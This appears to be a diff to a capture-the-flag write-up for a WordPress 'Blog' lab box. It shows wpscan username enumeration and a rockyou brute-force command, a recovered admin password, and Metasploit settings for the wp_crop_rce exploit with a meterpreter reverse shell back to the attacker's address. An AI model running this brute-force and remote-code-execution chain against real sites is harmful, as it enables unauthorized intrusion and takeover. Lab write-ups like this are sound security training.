@@ -253,12 +253,51 @@ Interesting Finding(s):
 [+] Memory used: 310.105 MB
 [+] Elapsed time: 00:01:11
 ```
-> found two usernames<br/>Let's add them to users.txt file
+> Found two usernames<br/>Let's add them to users.txt file
 > Now let's try two brute force wp-admin using rockyou dict.
 
-> Wait! This login form shows what exactly incorrect: username or passwd
+> Wait! This login form shows what exactly incorrect: username or passwd</br>
 > Let's determine correct user manually -> it's bjoel
 
-## Bruteforcing wp-adming via wpscan for user bjoel
+> Nope... They both are correct. I just entered first username incorrectly.
+
+## Bruteforcing wp-adming via wpscan
 ```
-wpscan --url blog.thm -U bjoel -P /usr/share/wordlists/rockyou.txt
+wpscan --url blog.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
+```
+password is cutiepie1 for user kwheel
+
+> This infor is catched from walkthrough from youtube, just because real bruteforcing is to long
+
+> So wp admin panel accessed<br/>
+> Let's look around
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.227.2      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
+                                         ki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
+   USERNAME   kwheel           yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.31.248      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
